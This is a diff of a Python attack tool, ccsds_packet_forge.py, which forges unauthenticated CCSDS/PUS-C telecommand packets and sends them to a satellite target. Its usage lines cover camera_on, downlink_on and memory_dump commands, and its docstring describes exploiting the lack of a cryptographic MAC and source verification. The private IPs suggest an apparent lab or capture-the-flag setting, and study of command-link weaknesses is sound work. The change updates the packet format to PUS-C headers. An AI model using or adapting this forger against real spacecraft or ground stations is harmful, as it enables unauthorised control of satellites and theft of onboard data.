@@ -10,7 +10,7 @@ CCSDS checksum validates INTEGRITY (no corruption) but not AUTHENTICITY
 
 Usage:
   python3 ccsds_packet_forge.py nop
-  python3 ccsds_packet_forge.py send --cmd nop --ip 192.168.60.100 --port 1234
+  python3 ccsds_packet_forge.py send --cmd nop --ip 192.168.61.100 --port 1234
   python3 ccsds_packet_forge.py send --cmd camera_on
   python3 ccsds_packet_forge.py send --cmd downlink_on
   python3 ccsds_packet_forge.py send --cmd memory_dump
@@ -26,10 +26,13 @@ CCSDS Primary Header (6 bytes):
   Bits 18-31: Sequence count (14 bits)
   Bits 32-47: Data length (payload length - 1)
 
-CCSDS Secondary Header (2 bytes, command packets):
-  Bits 0-6: Function code (7 bits)
-  Bit  7:   Reserved (0)
-  Bits 8-15: Checksum (XOR of all bytes before it XORed against 0xFF)
+PUS-C TC Secondary Header (7 bytes, ECSS-E-ST-70-41C):
+  Byte 0:    PUS version + ack flags (0x21 for PUS-C with acceptance ack)
+  Byte 1:    Service type (128 = mission cmd)
+  Byte 2:    Service subtype (1)
+  Bytes 3-4: Source ID (big-endian, 0x0001)
+  Byte 5:    Function code
+  Byte 6:    Checksum (XOR of 0xFF with all preceding secondary bytes)
 
 Attack vector: No cryptographic MAC. The checksum is deterministic and
 computable by any attacker. Source IP is not verified by the satellite.
@@ -161,7 +164,7 @@ def cmd_list(args):
         "mission_downlink_disable":"Disable mission data downlink",
     }
     for name, (fc, _) in COMMANDS.items():
-        pkt = build_packet(SATELLITE_APID, fc)
+        pkt = build_pus_packet(SATELLITE_APID, fc)
         print(f"  {name:<15} 0x{fc:02X}         {effects.get(name, '')}")
         print(f"  {'':15} {'hex:':<12} {pkt.hex()}")
     print()
@@ -171,9 +174,9 @@ def cmd_forge(args):
     if args.cmd not in COMMANDS:
         print(f"Unknown command: {args.cmd}. Use 'list' to see options.")
         sys.exit(1)
-    func_code, user_data = COMMANDS[args.cmd]
-    pkt = build_packet(SATELLITE_APID, func_code, user_data)
-    print(f"\n  Forged packet: {pkt.hex()}")
+    func_code, _ = COMMANDS[args.cmd]
+    pkt = build_pus_packet(SATELLITE_APID, func_code)
+    print(f"\n  Forged PUS-C TC[128,1] packet: {pkt.hex()}")
     info = parse_packet(pkt)
     for k, v in info.items():
         print(f"    {k}: {v}")
